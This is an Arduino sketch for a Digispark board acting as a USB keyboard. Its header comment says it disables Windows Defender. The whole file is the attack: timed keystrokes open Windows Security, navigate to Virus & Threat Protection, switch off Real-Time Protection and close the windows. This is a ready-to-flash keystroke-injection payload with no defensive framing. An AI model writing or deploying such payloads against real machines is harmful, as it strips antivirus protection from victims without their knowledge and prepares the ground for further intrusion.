/* 
 *  This DigiKeyboard script disables Windows Defender. The delay for each step can be customized according to your preference.
*/



#include "DigiKeyboard.h"
#define KEY_ESC 41

void setup() {
  // Initialize the DigiKeyboard
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // Open the Start Menu
  DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(2000);

  // Type "Windows Security" and press Enter
  DigiKeyboard.print("Windows Security Settings");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);

  // Navigate to Virus & Threat Protection
  for (int i = 0; i < 4; i++) {
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(1000);
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);

  // Toggle off Real-Time Protection
  for (int i = 0; i < 4; i++) {
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(1000);
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);

  // Close the two windows that we have opened
  for (int i = 0; i <= 1; i++) {
    DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
    DigiKeyboard.delay(700);
  }
  DigiKeyboard.delay(1000);
}

void loop() {
}
